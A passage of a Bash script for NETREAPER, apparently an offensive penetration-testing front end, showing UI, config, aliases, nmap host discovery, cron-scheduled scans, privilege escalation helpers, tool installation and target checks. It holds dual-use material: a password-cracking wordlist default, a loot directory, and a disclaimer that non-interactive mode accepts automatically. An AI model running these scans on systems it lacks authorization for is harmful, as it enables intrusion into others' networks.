    while kill -0 "$pid" 2>/dev/null; do
        printf "\r    ${C_GHOST}%s${C_RESET} %s..." "${frames[$i]}" "$msg"
        i=$(( (i+1) % ${#frames[@]} ))
        sleep 0.08
    done
    printf "\r    ${C_VENOM}✓${C_RESET} %s      \n" "$msg"
    tput cnorm 2>/dev/null || true
}

progress_bar() {
    local current="${1:-0}" total="${2:-1}" width=40 label="${3:-}"
    local pct=$((current * 100 / total))
    local filled=$((current * width / total))
    local empty=$((width - filled))
    printf '\r    %s[%s' "$C_SHADOW" "$C_RESET"
    printf '%s%*s%s' "$C_VENOM" "$filled" "" "$C_RESET" | tr ' ' '█'
    printf '%s%*s%s' "$C_SHADOW" "$empty" "" "$C_RESET" | tr ' ' '░'
    printf '%s]%s %s%3d%%%s' "$C_SHADOW" "$C_RESET" "$C_SKULL" "$pct" "$C_RESET"
    [[ -n "$label" ]] && printf ' %s%s%s' "$C_DIM" "$label" "$C_RESET"
}

draw_line() {
    local char="${1:-─}" width="${2:-70}"
    printf '%*s\n' "$width" '' | tr ' ' "$char"
}

#═══════════════════════════════════════════════════════════════════════════════
# CONFIG & STATE
#═══════════════════════════════════════════════════════════════════════════════

ensure_state_dirs() {
    mkdir -p "$CONFIG_DIR" "$LOG_DIR" "$OUTPUT_DIR" "$LOOT_DIR" "$SESSIONS_DIR" "$PROFILES_DIR"
    touch "$HISTORY_FILE" "$FAVORITES_FILE" "$ALIASES_FILE"
}

load_config() {
    ensure_state_dirs
    if [[ -f "$CONFIG_FILE" ]]; then
        while IFS='=' read -r key val; do
            [[ -z "$key" ]] && continue
            [[ "$key" =~ ^# ]] && continue
            case "$key" in
                DEFAULT_INTERFACE) DEFAULT_INTERFACE="$val" ;;
                WORDLIST) DEFAULT_WORDLIST="$val" ;;
                THEME) DEFAULT_THEME="$val" ;;
            esac
        done < "$CONFIG_FILE"
    fi
    DEFAULT_INTERFACE="${DEFAULT_INTERFACE:-wlan0}"
    DEFAULT_WORDLIST="${DEFAULT_WORDLIST:-/usr/share/wordlists/rockyou.txt}"
    DEFAULT_THEME="${DEFAULT_THEME:-default}"
}

cmd_config() {
    local action="${1:-edit}"
    ensure_state_dirs

    case "$action" in
        view)
            if [[ -f "$CONFIG_FILE" ]]; then
                log_info "Configuration (${CONFIG_FILE}):"
                sed 's/^/    /' "$CONFIG_FILE"
            else
                log_warning "No config found at ${CONFIG_FILE}"
            fi
            ;;
        edit|*)
            local editor="${EDITOR:-nano}"
            log_info "Opening config with ${editor}"
            "$editor" "$CONFIG_FILE"
            ;;
    esac
}

record_history() {
    local target="${1:-}"
    [[ -z "$target" ]] && return
    ensure_state_dirs
    local last
    last=$(tail -n1 "$HISTORY_FILE" 2>/dev/null || true)
    [[ "$last" == "$target" ]] && return
    echo "$target" >> "$HISTORY_FILE"
}

show_history() {
    ensure_state_dirs
    if [[ ! -s "$HISTORY_FILE" ]]; then
        log_warning "No history yet"
        return
    fi
    nl -ba "$HISTORY_FILE" | tail -n 20
}

add_favorite() {
    local name="${1:-}" target="${2:-}"
    ensure_state_dirs
    [[ -z "$name" || -z "$target" ]] && { log_error "Favorite name and target required"; return 1; }
    grep -v "^${name}:" "$FAVORITES_FILE" 2>/dev/null >"${FAVORITES_FILE}.tmp" || true
    mv "${FAVORITES_FILE}.tmp" "$FAVORITES_FILE"
    echo "${name}:${target}" >> "$FAVORITES_FILE"
    log_success "Favorite saved: ${name} -> ${target}"
}

list_favorites() {
    ensure_state_dirs
    if [[ ! -s "$FAVORITES_FILE" ]]; then
        log_warning "No favorites configured"
        return
    fi
    while IFS=':' read -r name target; do
        printf "    %s => %s\n" "$name" "$target"
    done < "$FAVORITES_FILE"
}

get_favorite() {
    local name="${1:-}"
    ensure_state_dirs
    grep -E "^${name}:" "$FAVORITES_FILE" 2>/dev/null | head -n1 | cut -d':' -f2-
}

resolve_target_alias() {
    local input="${1:-}"
    if [[ "$input" == "@last" ]]; then
        tail -n1 "$HISTORY_FILE" 2>/dev/null
        return
    fi
    if [[ "$input" =~ ^@fav:(.+)$ ]]; then
        get_favorite "${BASH_REMATCH[1]}"
        return
    fi
    echo "$input"
}

add_alias() {
    local name="${1:-}" body="${2:-}"
    ensure_state_dirs
    [[ -z "$name" || -z "$body" ]] && { log_error "Alias name and command required"; return 1; }
    grep -v "^${name}:" "$ALIASES_FILE" 2>/dev/null >"${ALIASES_FILE}.tmp" || true
    mv "${ALIASES_FILE}.tmp" "$ALIASES_FILE"
    echo "${name}:${body}" >> "$ALIASES_FILE"
    log_success "Alias added: ${name} -> ${body}"
}

list_aliases() {
    ensure_state_dirs
    if [[ ! -s "$ALIASES_FILE" ]]; then
        log_warning "No aliases defined"
        return
    fi
    while IFS=':' read -r name body; do
        printf "    %s => %s\n" "$name" "$body"
    done < "$ALIASES_FILE"
}

remove_alias() {
    local name="${1:-}"
    ensure_state_dirs
    grep -v "^${name}:" "$ALIASES_FILE" 2>/dev/null >"${ALIASES_FILE}.tmp" || true
    mv "${ALIASES_FILE}.tmp" "$ALIASES_FILE"
    log_success "Alias removed: $name"
}

expand_aliases() {
    local first="${1:-}"
    shift || true
    [[ -z "$first" ]] && return 1
    ensure_state_dirs
    local line
    line=$(grep -E "^${first}:" "$ALIASES_FILE" 2>/dev/null | head -n1)
    [[ -z "$line" ]] && return 1
    local body
    body=${line#*:}
    read -r -a EXPANDED_ARGS <<< "$body"
    EXPANDED_ARGS+=("$@")
    return 0
}

profile_save() {
    local name="${1:-}"; shift
    ensure_state_dirs
    [[ -z "$name" ]] && { log_error "Profile name required"; return 1; }
    mkdir -p "$PROFILES_DIR"
    printf '%s\n' "$*" > "${PROFILES_DIR}/${name}.profile"
    log_success "Profile saved: $name"
}

profile_load() {
    local name="${1:-}"
    [[ -f "${PROFILES_DIR}/${name}.profile" ]] || return 1
    cat "${PROFILES_DIR}/${name}.profile"
}

profile_list() {
    ensure_state_dirs
    find "$PROFILES_DIR" -maxdepth 1 -type f -name "*.profile" -print 2>/dev/null | sed 's#.*/##;s/\.profile$//' || true
}

discover_targets() {
    ensure_state_dirs
    local subnet="${1:-}"
    check_tool "nmap" || return 1
    if [[ -z "$subnet" ]]; then
        subnet=$(ip -o -f inet addr show | awk '/scope global/{print $4; exit}')
        subnet="${subnet:-192.168.1.0/24}"
    fi
    log_info "Discovering hosts on $subnet"
    local tmp
    tmp="${TMP_DIR}/discover_$(date +%s).log"
    mkdir -p "$TMP_DIR"
    nmap -sn "$subnet" | tee "$tmp"
    mapfile -t hosts < <(grep "Nmap scan report for" "$tmp" | awk '{print $5}' | sed 's/(//;s/)//')
    if [[ ${#hosts[@]} -eq 0 ]]; then
        log_warning "No hosts discovered"
        return 1
    fi
    echo
    local i=1
    for h in "${hosts[@]}"; do
        printf "    [%d] %s\n" "$i" "$h"
        i=$((i+1))
    done
    echo -ne "    ${C_FIRE}Select target (0=cancel): ${C_RESET}"
    read -r pick
    [[ "$pick" == "0" || -z "$pick" ]] && return 0
    local idx=$((pick-1))
    if (( idx < 0 || idx >= ${#hosts[@]} )); then
        log_error "Invalid selection"
        return 1
    fi
    TARGET="${hosts[$idx]}"
    record_history "$TARGET"
    log_success "Selected target: $TARGET"
    return 0
}

schedule_scan() {
    local action="${1:-}"; shift || true
    case "$action" in
        add)
            local spec="${1:-}"; shift
            local args="$*"
            [[ -z "$spec" || -z "$args" ]] && { log_error "Usage: schedule add \"CRON\" <netreaper args>"; return 1; }
            local bin_path
            bin_path=$(command -v "$SCRIPT_NAME" 2>/dev/null || true)
            bin_path="${bin_path:-${SCRIPT_DIR}/${SCRIPT_NAME}}"
            (crontab -l 2>/dev/null; echo "${spec} ${bin_path} ${args} >> ${LOG_DIR}/cron.log 2>&1") | crontab -
            log_success "Scheduled: ${spec} ${bin_path} ${args}"
            ;;
        list)
            crontab -l 2>/dev/null | grep "$SCRIPT_NAME" || log_warning "No scheduled scans"
            ;;
        clear)
            crontab -l 2>/dev/null | grep -v "$SCRIPT_NAME" | crontab -
            log_success "Cleared scheduled scans"
            ;;
        *)
            log_error "Usage: schedule [add|list|clear]"
            return 1
            ;;
    esac
}

diff_scans() {
    local file_a="${1:-}" file_b="${2:-}"
    [[ -z "$file_a" || -z "$file_b" ]] && { log_error "Usage: diff <file1> <file2>"; return 1; }
    [[ -f "$file_a" && -f "$file_b" ]] || { log_error "Both files must exist"; return 1; }
    diff -u "$file_a" "$file_b" | sed 's/^-/[ -]/;s/^+/[ +]/' || true
}

ensure_builtin_aliases() {
    ensure_state_dirs
    local builtin=("qs:scan --quick" "q:scan --quick" "full:scan --full" "stealth:scan --stealth" "vuln:scan --vuln")
    for entry in "${builtin[@]}"; do
        local name="${entry%%:*}" body="${entry#*:}"
        if ! grep -q "^${name}:" "$ALIASES_FILE" 2>/dev/null; then
            echo "${name}:${body}" >> "$ALIASES_FILE"
        fi
    done
}

favorite_cmd() {
    local action="${1:-}"; shift || true
    case "$action" in
        add) add_favorite "$1" "$2" ;;
        list) list_favorites ;;
        use)
            local fav
            fav=$(get_favorite "$1")
            [[ -z "$fav" ]] && { log_error "Favorite not found"; return 1; }
            echo "$fav"
            ;;
        *) log_error "Usage: favorite [add <name> <target>|list|use <name>]" ;;
    esac
}

alias_cmd() {
    local action="${1:-}"; shift || true
    case "$action" in
        add) add_alias "$1" "$*" ;;
        remove) remove_alias "$1" ;;
        list|ls) list_aliases ;;
        *) log_error "Usage: alias [add <name> <cmd>|remove <name>|list]" ;;
    esac
}

profile_cmd() {
    local action="${1:-}"; shift || true
    case "$action" in
        save) profile_save "$1" "$@" ;;
        load)
            local args
            args=$(profile_load "$1") || { log_error "Profile not found"; return 1; }
            echo "$args"
            ;;
        list|ls) profile_list ;;
        *) log_error "Usage: profile [save <name> <scan args>|load <name>|list]" ;;
    esac
}

discover_cmd() {
    local subnet="${1:-}"
    discover_targets "$subnet"
}

export_cmd() {
    local file="${1:-}" fmt="${2:-}"
    export_output "$file" "$fmt"
}

schedule_cmd() {
    local action="${1:-}"; shift || true
    schedule_scan "$action" "$@"
}

diff_cmd() {
    diff_scans "$1" "$2"
}

export_output() {
    local infile="${1:-}" format="${2:-}"
    [[ -z "$infile" || -z "$format" ]] && { log_error "Usage: export <file> <json|csv|html|md>"; return 1; }
    [[ -f "$infile" ]] || { log_error "File not found: $infile"; return 1; }
    local outfile="${infile%.*}.${format}"
    case "$format" in
        json)
            python3 - <<PY > "$outfile"
import json,sys
text=open("$infile","r",encoding="utf-8",errors="ignore").read().splitlines()
json.dump(text,sys.stdout,indent=2)
PY
            ;;
        csv)
            nl -ba "$infile" | awk -F"\t" '{print $1 "," $2}' > "$outfile"
            ;;
        html)
            {
                echo "<html><body><pre>"
                sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g' "$infile"
                echo "</pre></body></html>"
            } > "$outfile"
            ;;
        md)
            {
                echo '```'
                cat "$infile"
                echo '```'
            } > "$outfile"
            ;;
        *) log_error "Unknown format: $format"; return 1 ;;
    esac
    log_loot "Exported: $outfile"
}

check_for_update() {
    local latest
    latest=$(curl -fsSL "https://raw.githubusercontent.com/Nerds489/NETREAPER/main/VERSION" 2>/dev/null || true)
    if [[ -z "$latest" ]]; then
        log_warning "Could not check for updates"
        return 1
    fi
    if [[ "$latest" != "$VERSION" ]]; then
        log_info "Update available: ${latest} (current ${VERSION})"
        log_info "Run: wget https://raw.githubusercontent.com/Nerds489/NETREAPER/main/netreaper -O netreaper && chmod +x netreaper"
    else
        log_success "You are on the latest version (${VERSION})"
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# BANNER
#═══════════════════════════════════════════════════════════════════════════════

show_banner() {
    clear
    echo -e "${C_RED}"
    cat << 'BANNER'
    
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║                                                                           ║
    ║  ███╗   ██╗███████╗████████╗██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗  ║
    ║  ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗ ║
    ║  ██╔██╗ ██║█████╗     ██║   ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝ ║
    ║  ██║╚██╗██║██╔══╝     ██║   ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗ ║
    ║  ██║ ╚████║███████╗   ██║   ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║ ║
    ║  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝ ║
    ║                                                                           ║
    ╚═══════════════════════════════════════════════════════════════════════════╝
BANNER
    echo -e "${C_RESET}"
    echo
    echo -e "    ${C_BORDER}══════════════════════════════════════════════════════════════════════${C_RESET}"
    echo -e "    ${C_SHADOW}║${C_RESET} ${C_RED}\"Some tools scan.${C_RESET} ${C_CYAN}Some tools attack.${C_RESET} ${C_GREEN}I do both.\"${C_RESET}               ${C_SHADOW}║${C_RESET}"
    echo -e "    ${C_BORDER}══════════════════════════════════════════════════════════════════════${C_RESET}"
    echo -e "                   ${C_SHADOW}[${C_RESET} ${C_RED}v${VERSION}${C_RESET} ${C_SHADOW}•${C_RESET} ${C_CYAN}${CODENAME}${C_RESET} ${C_SHADOW}•${C_RESET} ${C_GREEN}70+ Tools${C_RESET} ${C_SHADOW}]${C_RESET}"
    echo
}

show_mini_banner() {
    echo -e "${C_BLOOD}    ╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "${C_BLOOD}    ║${C_RESET}  ${C_SKULL}NETREAPER${C_RESET} ${C_SHADOW}v${VERSION}${C_RESET}                                              ${C_BLOOD}║${C_RESET}"
    echo -e "${C_BLOOD}    ╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
}

#═══════════════════════════════════════════════════════════════════════════════
# LEGAL DISCLAIMER
#═══════════════════════════════════════════════════════════════════════════════

show_skull() {
    echo -e "${C_BLOOD}"
    cat << 'SKULL'
                              ______
                           .-"      "-.
                          /            \
                         |              |
                         |,  .-.  .-.  ,|
                         | )(_o/  \o_)( |
                         |/     /\     \|
                         (_     ^^     _)
                          \__|IIIIII|__/
                           | \IIIIII/ |
                           \          /
                            `--------`
SKULL
    echo -e "${C_RESET}"
}

show_legal() {
    show_skull
    echo -e "${C_BLOOD}${C_BOLD}"
    echo "    ╔═══════════════════════════════════════════════════════════════════╗"
    echo "    ║                     ⚠  LEGAL DISCLAIMER  ⚠                        ║"
    echo "    ╠═══════════════════════════════════════════════════════════════════╣"
    echo "    ║                                                                   ║"
    echo "    ║  This tool is for AUTHORIZED PENETRATION TESTING ONLY.            ║"
    echo "    ║                                                                   ║"
    echo "    ║  By proceeding, you confirm:                                      ║"
    echo "    ║  • You have WRITTEN authorization to test target systems          ║"
    echo "    ║  • You accept FULL legal responsibility for your actions          ║"
    echo "    ║  • You understand unauthorized access is a FEDERAL CRIME          ║"
    echo "    ║  • The authors accept NO LIABILITY for misuse                     ║"
    echo "    ║                                                                   ║"
    echo "    ║  CFAA violations: Up to 20 years imprisonment                     ║"
    echo "    ║                                                                   ║"
    echo "    ╚═══════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo
    echo -ne "    ${C_FIRE}Type '${C_VENOM}I ACCEPT${C_FIRE}' to proceed (case sensitive): ${C_RESET}"
}

check_legal() {
    if is_non_interactive; then
        mkdir -p "$(dirname "$LEGAL_FILE")"
        if [[ ! -f "$LEGAL_FILE" ]]; then
            echo "$(date -Iseconds) | $(whoami)@$(hostname) | Auto-accepted (non-interactive)" > "$LEGAL_FILE"
        fi
        return 0
    fi

    [[ -f "$LEGAL_FILE" ]] && return 0
    
    clear
    show_legal
    read -r response
    
    if [[ "$response" == "I ACCEPT" ]]; then
        mkdir -p "$(dirname "$LEGAL_FILE")"
        echo "$(date -Iseconds) | $(whoami)@$(hostname) | Accepted" > "$LEGAL_FILE"
        echo
        typewriter "    Access granted. The reaper awakens." 0.02
        sleep 1
        return 0
    else
        echo -e "\n    ${C_BLOOD}Access denied. Come back when you're ready.${C_RESET}\n"
        exit 1
    fi
}

first_run_wizard() {
    if is_non_interactive; then
        check_legal
        config_set FIRST_RUN_COMPLETE true
        return 0
    fi

    clear
    echo
    echo -e "    ${C_FIRE}╔═══════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "    ${C_FIRE}║${C_RESET}                                                                       ${C_FIRE}║${C_RESET}"
    echo -e "    ${C_FIRE}║${C_RESET}    ${C_RED}███╗   ██╗███████╗████████╗██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ ${C_RESET}    ${C_FIRE}║${C_RESET}"
    echo -e "    ${C_FIRE}║${C_RESET}    ${C_RED}████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗${C_RESET}    ${C_FIRE}║${C_RESET}"
    echo -e "    ${C_FIRE}║${C_RESET}    ${C_RED}██╔██╗ ██║█████╗     ██║   ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝${C_RESET}    ${C_FIRE}║${C_RESET}"
    echo -e "    ${C_FIRE}║${C_RESET}    ${C_RED}██║╚██╗██║██╔══╝     ██║   ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗${C_RESET}    ${C_FIRE}║${C_RESET}"
    echo -e "    ${C_FIRE}║${C_RESET}    ${C_RED}██║ ╚████║███████╗   ██║   ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║${C_RESET}    ${C_FIRE}║${C_RESET}"
    echo -e "    ${C_FIRE}║${C_RESET}    ${C_RED}╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝${C_RESET}    ${C_FIRE}║${C_RESET}"
    echo -e "    ${C_FIRE}║${C_RESET}                                                                       ${C_FIRE}║${C_RESET}"
    echo -e "    ${C_FIRE}║${C_RESET}                  ${C_CYAN}Welcome to NETREAPER v${VERSION}${C_RESET}                          ${C_FIRE}║${C_RESET}"
    echo -e "    ${C_FIRE}║${C_RESET}           ${C_SHADOW}\"Some tools scan. Some tools attack. I do both.\"${C_RESET}            ${C_FIRE}║${C_RESET}"
    echo -e "    ${C_FIRE}║${C_RESET}                                                                       ${C_FIRE}║${C_RESET}"
    echo -e "    ${C_FIRE}╚═══════════════════════════════════════════════════════════════════════╝${C_RESET}"
    echo

    echo -e "    ${C_SHADOW}This appears to be your first time running NETREAPER.${C_RESET}"
    echo -e "    ${C_SHADOW}Let me help you get set up.${C_RESET}"
    echo

    # Use check_legal for consistent acceptance handling
    check_legal

    echo
    echo -e "    ${C_CYAN}━━━ Configuration ━━━${C_RESET}"
    echo

    if confirm "Enable verbose output by default?" "n"; then
        config_set VERBOSE true
        log_info "Verbose mode enabled"
    fi

    if confirm "Check for updates on startup?" "y"; then
        config_set AUTO_UPDATE_CHECK true
        log_info "Auto-update check enabled"
    fi

    echo
    if confirm "Install essential tools now? (recommended)" "y"; then
        echo
        log_info "Installing essential tools..."
        cmd_install_quick || true
    fi

    config_set FIRST_RUN_COMPLETE true
    config_set SETUP_DATE "$(date '+%Y-%m-%d')"

    echo
    echo -e "    ${C_GREEN}╔═══════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "    ${C_GREEN}║${C_RESET}                  ${C_FIRE}✓ SETUP COMPLETE${C_RESET}                                   ${C_GREEN}║${C_RESET}"
    echo -e "    ${C_GREEN}╚═══════════════════════════════════════════════════════════════════════╝${C_RESET}"
    echo
    echo -e "    ${C_SHADOW}Type ${C_CYAN}netreaper help${C_RESET}${C_SHADOW} to see available commands${C_RESET}"
    echo -e "    ${C_SHADOW}Type ${C_CYAN}netreaper${C_RESET}${C_SHADOW} to launch the interactive menu${C_RESET}"
    echo
    read -rp "    Press Enter to continue..."
}

#═══════════════════════════════════════════════════════════════════════════════
# UTILITIES
#═══════════════════════════════════════════════════════════════════════════════

is_root() {
    [[ $EUID -eq 0 ]]
}

is_non_interactive() {
    [[ ${NR_NON_INTERACTIVE:-0} -eq 1 || ! -t 0 ]]
}

run_with_sudo() {
    local func_name="${1:-}"
    shift || true

    if [[ -z "$func_name" ]]; then
        log_error "No function specified for sudo wrapper"
        return 1
    fi

    if is_root; then
        "$func_name" "$@"
        return $?
    fi

    log_warning "This operation requires root privileges"
    echo -ne "    ${C_PROMPT}Run with sudo? [Y/n]: ${C_RESET}"
    read -r confirm
    if [[ "${confirm,,}" == "n" ]]; then
        log_info "Operation cancelled"
        return 1
    fi

    local args_quoted
    args_quoted=$(printf ' %q' "$@")

    local env_decls=""
    local vars_to_export=(TARGET OUTPUT_FILE LOG_DIR OUTPUT_DIR LOOT_DIR CONFIG_DIR CONFIG_FILE BASE_LOG_DIR BASE_OUTPUT_DIR BASE_LOOT_DIR SESSION_NAME CURRENT_SESSION DEFAULT_INTERFACE DEFAULT_WORDLIST TMP_DIR QUIET JSON_OUTPUT NO_COLOR C_RESET C_BOLD C_DIM C_RED C_BLOOD C_FIRE C_BLUE C_CYAN C_STEEL C_GREEN C_YELLOW C_PURPLE C_ORANGE C_BORDER C_SHADOW C_GHOST C_WHITE C_SUCCESS C_ERROR C_WARNING C_INFO C_PROMPT C_VENOM C_SKULL C_GOLD)
    for var in "${vars_to_export[@]}"; do
        if declare -p "$var" &>/dev/null; then
            env_decls+=$(declare -p "$var")
            env_decls+=$'\n'
        fi
    done

    sudo -E bash -c "$(declare -f); ${env_decls}set -uo pipefail; ${func_name}${args_quoted}"
}

confirm() {
    local message="${1:-Continue?}" default="${2:-n}" prompt
    if [[ "$default" == "y" ]]; then prompt="[Y/n]"; else prompt="[y/N]"; fi
    echo -ne "    ${C_PROMPT}$message $prompt: ${C_RESET}"
    read -r response
    response="${response:-$default}"
    [[ "${response,,}" == "y" || "${response,,}" == "yes" ]]
}

confirm_dangerous() {
    local message="$1" confirm_word="${2:-YES}"
    echo
    echo -e "    ${C_RED}╔══════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "    ${C_RED}║${C_RESET}  ${C_YELLOW}⚠️  WARNING: POTENTIALLY DANGEROUS OPERATION  ⚠️${C_RESET}            ${C_RED}║${C_RESET}"
    echo -e "    ${C_RED}╚══════════════════════════════════════════════════════════════╝${C_RESET}"
    echo
    echo -e "    ${C_SHADOW}$message${C_RESET}"
    echo
    echo -ne "    ${C_YELLOW}Type '${confirm_word}' to confirm: ${C_RESET}"
    read -r response
    [[ "$response" == "$confirm_word" ]]
}

select_option() {
    local prompt="$1"; shift; local options=("$@")
    echo
    echo -e "    ${C_CYAN}$prompt${C_RESET}"
    echo
    local i=1
    for opt in "${options[@]}"; do
        echo -e "    ${C_GHOST}[$i]${C_RESET} $opt"
        ((i++))
    done
    echo
    echo -ne "    ${C_PROMPT}Select [1-${#options[@]}]: ${C_RESET}"
    read -r choice
    if [[ "$choice" =~ ^[0-9]+$ ]] && ((choice >= 1 && choice <= ${#options[@]})); then
        echo "${options[$((choice-1))]}"
        return 0
    fi
    return 1
}

prompt_input() {
    local message="$1" validator="${2:-}" default="${3:-}" display_default=""
    [[ -n "$default" ]] && display_default=" ${C_SHADOW}[$default]${C_RESET}"
    while true; do
        echo -ne "    ${C_PROMPT}$message${display_default}: ${C_RESET}" >&2
        read -r input
        input="${input:-$default}"
        input=$(strip_ansi "$input")
        if [[ -z "$input" ]]; then
            log_warning "Input required"
            continue
        fi
        if [[ -n "$validator" ]]; then
            if $validator "$input"; then
                echo "$input"
                return 0
            else
                log_warning "Invalid input, please try again"
                continue
            fi
        fi
        echo "$input"
        return 0
    done
}

validate_ip() { [[ "$1" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; }
validate_cidr() { [[ "$1" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$ ]]; }
validate_domain() { [[ "$1" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*$ ]]; }
validate_interface() { ip link show "$1" &>/dev/null; }
validate_file_exists() { [[ -f "$1" ]]; }
validate_port() { local p="$1"; [[ "$p" =~ ^[0-9]+$ ]] && ((p >= 1 && p <= 65535)); }

is_root() { [[ $EUID -eq 0 ]]; }
can_sudo() { sudo -n true 2>/dev/null; }

get_privilege_level() {
    if is_root; then echo "root"; elif can_sudo; then echo "sudo"; else echo "user"; fi
}

elevate_privileges() {
    if is_root; then return 0; fi
    log_warning "This operation requires root privileges"
    echo
    if confirm "Elevate to root?" "y"; then
        sudo -v && log_success "Privileges elevated" && return 0
        log_error "Failed to elevate privileges"; return 1
    fi
    return 1
}

run_privileged() {
    local cmd="$*"
    if is_root; then
        eval "$cmd"
    elif can_sudo; then
        sudo bash -c "$cmd"
    else
        if elevate_privileges; then
            sudo bash -c "$cmd"
        else
            log_error "Cannot run privileged command without root access"
            return 1
        fi
    fi
}

require_root() {
    local reason="${1:-This operation requires root privileges}"
    if is_root; then
        return 0
    fi
    echo
    echo -e "    ${C_YELLOW}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "    ${C_YELLOW}║${C_RESET}  ${C_RED}🔒 ROOT ACCESS REQUIRED${C_RESET}                                     ${C_YELLOW}║${C_RESET}"
    echo -e "    ${C_YELLOW}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
    echo
    echo -e "    ${C_SHADOW}Reason: $reason${C_RESET}"
    echo
    if confirm "Run with sudo?" "y"; then
        sudo -v || { log_error "Authentication failed"; return 1; }
        return 0
    fi
    return 1
}

drop_privileges() {
    if is_root && [[ -n "$SUDO_USER" ]]; then
        log_verbose "Dropping privileges to $SUDO_USER"
        su - "$SUDO_USER" -c "$*"
    else
        eval "$*"
    fi
}

check_tool() {
    local tool="${1:-}"; [[ -z "$tool" ]] && return 1
    if is_tool_installed "$tool"; then
        return 0
    fi
    log_warning "Tool not installed: $tool"
    echo -e "    ${C_SHADOW}Install: sudo apt install $tool${C_RESET}"
    return 1
}

get_tool_info() {
    local tool="$1" field="$2"
    local info="${TOOL_INFO[$tool]}"
    [[ -z "$info" ]] && return 1
    case "$field" in
        binary) echo "${info%%:*}" ;;
        package) echo "$info" | cut -d: -f2 ;;
        method) echo "$info" | cut -d: -f3 ;;
        category) echo "$info" | cut -d: -f4 ;;
        description) echo "$info" | cut -d: -f5- ;;
        *) echo "$info" ;;
    esac
}

install_tool() {
    local tool="$1"
    local method package
    method=$(get_tool_info "$tool" method) || { log_error "Unknown tool: $tool"; return 1; }
    package=$(get_tool_info "$tool" package)

    log_info "Installing $tool ($method)..."
    case "$method" in
        apt)
            run_privileged "DEBIAN_FRONTEND=noninteractive apt install -y $package" || return 1
            ;;
        pip)
            run_cmd "pip install $package" "pip3 install $package --user" || return 1
            ;;
        pipx)
            run_cmd "pipx install $package" "pipx install $package" || return 1
            ;;
        gem)
            run_cmd "gem install $package" "gem install $package" || return 1
            ;;
        go)
            run_cmd "go install $package" "GO111MODULE=on go install $package" || return 1
            ;;
        github|git)
            log_warning "Manual install required for $tool (method: $method)"
            return 1
            ;;
        *)
            log_error "Unknown install method: $method"
            return 1
            ;;
    esac

    if is_tool_installed "$tool"; then
        log_success "$tool installed"
        log_audit "INSTALL" "$tool" "SUCCESS"
        return 0
    else
        log_error "$tool installation failed"
        log_audit "INSTALL" "$tool" "FAILED"
        return 1
    fi
}

run_tool() {
    local tool="$1"; shift
    local args=($@)
    log_verbose "Running: $tool ${args[*]}"
    log_audit "RUN_TOOL" "$tool" "STARTED"
    if ! check_tool "$tool"; then
        if confirm "Install $tool now?" "y"; then
            install_tool "$tool" || return 1
        else
            log_error "Cannot proceed without $tool"
            return 1
        fi
    fi
    local binary
    binary=$(get_tool_info "$tool" binary 2>/dev/null || echo "$tool")
    start_timer
    "$binary" "${args[@]}"
    local status=$?
    local duration
    duration=$(end_timer)
    if ((status == 0)); then
        log_audit "RUN_TOOL" "$tool" "SUCCESS:$duration"
    else
        log_audit "RUN_TOOL" "$tool" "FAILED:$status:$duration"
    fi
    return $status
}

is_private_ip() {
    local ip="${1:-}"; [[ -z "$ip" ]] && return 1
    [[ "$ip" =~ ^10\. ]] && return 0
    [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[01])\. ]] && return 0
    [[ "$ip" =~ ^192\.168\. ]] && return 0
    [[ "$ip" =~ ^127\. ]] && return 0
    return 1
}

validate_target() {
    local target="${1:-}"
    [[ -z "$target" ]] && { log_error "No target specified"; return 1; }
    if [[ "$target" =~ \.(gov|mil)$ ]] || [[ "$target" =~ \.(gov|mil)/ ]]; then
        log_error "Targeting government/military domains is prohibited"
        return 1
    fi
    if ! is_private_ip "$target" && [[ ! "$target" =~ ^(localhost|127\.) ]]; then
        echo
        echo -e "    ${C_FIRE}⚠  EXTERNAL TARGET DETECTED${C_RESET}"
        log_target "$target"
        if ! confirm_action "Do you have written authorization?" "n"; then
            return 1
        fi
    fi
    return 0
}

get_target() {
    local target_type="${1:-any}"
    echo
    echo -e "    ${C_CYAN}╔═══════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "    ${C_CYAN}║${C_RESET}                    ${C_FIRE}🎯 TARGET SELECTION${C_RESET}                       ${C_CYAN}║${C_RESET}"
    echo -e "    ${C_CYAN}╚═══════════════════════════════════════════════════════════════╝${C_RESET}"
    echo

    if [[ -f "${HISTORY_FILE}" ]]; then
        echo -e "    ${C_SHADOW}Recent targets:${C_RESET}"
        tail -5 "${HISTORY_FILE}" | while read -r t; do
